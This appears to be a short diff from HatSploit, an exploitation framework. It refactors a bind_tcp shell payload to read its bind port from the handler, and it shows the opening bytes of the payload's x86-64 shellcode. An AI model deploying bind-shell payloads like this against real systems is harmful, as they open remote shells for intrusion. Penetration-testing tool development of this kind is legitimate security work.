@@ -23,17 +23,8 @@ class HatSploitPayload(Payload):
         'Type': "bind_tcp"
     }
 
-    options = {
-        'BPORT': {
-            'Description': "Bind port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        bind_port = self.parse_options(self.options)
+        bind_port = self.handler['BPORT']
 
         return (
             b"\x48\x31\xff"      # xorq  %rdi, %rdi
